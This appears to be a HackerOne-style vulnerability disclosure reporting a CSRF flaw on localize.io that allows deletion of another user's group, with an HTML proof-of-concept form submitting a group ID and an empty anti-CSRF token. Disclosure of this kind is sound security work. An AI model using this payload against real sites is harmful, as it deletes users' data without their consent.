# HackerOne Report: Group Deletion Via CSRF
**Report ID:** 8218
**Vulnerability Class:** Cross-Site Request Forgery (CSRF)

## Vulnerability Information & PoC
Hi Team,

I have found a CSRF vulnerability using which the attacker can delete a group on any users account as the anti-csrf token is not getting validated on the server-side. 


Group Deletion Via CSRF Code:

<html>
  <body>
    <form action="http://www.localize.io/pages/create_project/9k" method="POST">
      <input type="hidden" name="CSRFToken" value="" />
      <input type="hidden" name="deleteGroup[id]" value="140" />
      <input type="submit" value="Submit form" />
    </form>
  </body>
</html>


## Discussion & Remediation Timeline
